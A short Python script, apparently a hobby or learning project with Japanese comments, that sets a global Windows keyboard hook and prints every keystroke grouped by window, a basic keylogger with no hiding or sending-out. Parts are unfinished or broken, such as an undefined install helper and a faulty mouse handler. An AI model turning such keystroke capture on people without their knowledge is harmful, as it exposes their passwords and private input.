import pythoncom
import pyWinhook as pyHook
import hashlib

def InstallNeedPackages():
    """必要なパッケージのインストール
    """
    PackageInstall("pyWinhook")
    PackageInstall("pywin32")
    
def OnKeyboardEvent(event):
    global inputStrDict
    global keyLog
    
    # 初回の呼び出し時のみ実行するコード
    if not hasattr(OnKeyboardEvent, "_has_run_once"):
        keyLog = []
        # 初回の呼び出しを記録する
        OnKeyboardEvent._has_run_once = True

    #ユーザーがエンターキーまたはタブキーを押したら入力が確定となる
    #それまでは入力された文字を表示しない
    #辞書を作り、キーを'Window'番号で管理し、キーを入力文字として管理しておく

    inputStrDict = {}

    inputStrDict[event.Window] = []
    #入力が確定したら、辞書からキーを削除する
    # ここにキーイベントを処理するコードを記述
    if event.Key == 'Return' or event.Key == 'Tab':
        keyLog.append(event.Key)
        inputStrDict[event.Window] = keyLog
        keyLog = []
        print("log:",inputStrDict[event.Window])   #出力処理を書く
    else :
        if len(keyLog) == 0:
            keyLog.append(event.Key)   #ログの蓄積
        elif keyLog[-1] == 'Lshift' and event.Key == 'Lshift':   #Lshift長押し時の処理、Ctrlなどもあってもいいかも
            pass
        else:
            keyLog.append(event.Key)
        
    print('Key:', event.Key)
    print('Window:', event.Window)
    return True

def OnMouseEvent(event):
    if event.MessageName == 'mouse left down':   #パッドは反応しなかった...
        keyLog.append(event.Key)
        inputStrDict[event.Window] = keyLog
        keyLog = []
        print("log:",inputStrDict[event.Window])   #出力処理を書く
    return True

if __name__ == '__main__':
    """メイン処理
    """

    # フックマネージャーの作成
    hm = pyHook.HookManager()
    # キーボードイベントの設定
    hm.KeyDown = OnKeyboardEvent
    # フックの開始
    hm.HookKeyboard()

    # メッセージを処理する
    pythoncom.PumpMessages()